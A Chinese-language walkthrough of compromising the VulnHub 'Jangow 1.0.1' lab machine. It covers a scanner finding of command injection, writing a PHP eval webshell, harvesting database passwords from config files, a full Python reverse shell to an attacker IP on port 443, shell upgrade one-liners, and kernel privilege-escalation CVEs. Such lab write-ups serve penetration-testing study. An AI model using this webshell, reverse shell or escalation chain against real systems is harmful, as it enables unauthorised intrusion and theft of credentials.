[https://www.vulnhub.com/entry/jangow-101,754/](https://www.vulnhub.com/entry/jangow-101,754/)

xray扫描得知存在命令执行

```
[Vuln: cmd-injection]
Target           "http://192.168.56.118/site/busque.php?buscar="
VulnType         "injection/cmd"
Payload          "\nexpr 924417132 + 879096350\n"
Position         "query"
ParamKey         "buscar"
ParamValue       "\nexpr 924417132 + 879096350\n"
feature          "1803513482"
type             "echo_based"
```

写入webshell,`echo '<?php eval($_POST[a]);?>' > a.php`,权限为`www-data`

`/var/www/html/.backup`

```php
$servername = "localhost";
$database = "jangow01";
$username = "jangow01";
$password = "abygurl69";
// Create connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}
echo "Connected successfully";
mysqli_close($conn);
```

`/var/www/html/site/wordpress/config.php`

```php
<?php
$servername = "localhost";
$database = "desafio02";
$username = "desafio02";
$password = "abygurl69";
// Create connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}
echo "Connected successfully";
mysqli_close($conn);
?>
```

但用户名和密码均不正确...

`/home/jangow01/user.txt`

```
d41d8cd98f00b204e9800998ecf8427e
```

cmd5反查得知其为空字符的md5

反弹shell,发现存在端口限制,试了试80,443等常用端口,发现443端口不受影响

```python
import socket
import subprocess
import os
ip="192.168.56.1"
port=443
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((ip,port))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

尝试切换用户`jangow01`,返回`su: must be run from a terminal`,需要将反弹回来的shell转换为交互式的shell

1. `python3 -c 'import pty;pty.spawn("/bin/bash")'`

2. `python3 -c "__import__('subprocess').call(['/bin/bash'])"`

建议使用第一种方法,成功利用密码`abygurl69`切换到用户`jangow01`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202112021941801.png)

靶机环境为`ubuntu16.04`,直接用`CVE-2021-3156`尝试提权,提示`AssertionError: glibc is too old. The exploit is relied on glibc tcache feature. Need version >= 2.26`

换个`CVE-2016-5195`,好像宕机了qwq,在真实渗透环境已经gg了...

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202112021927760.png)

尝试用`CVE-2017-16995`提权,成功提权

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202112022112151.png)

ufw配置情况

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202112022120567.png)
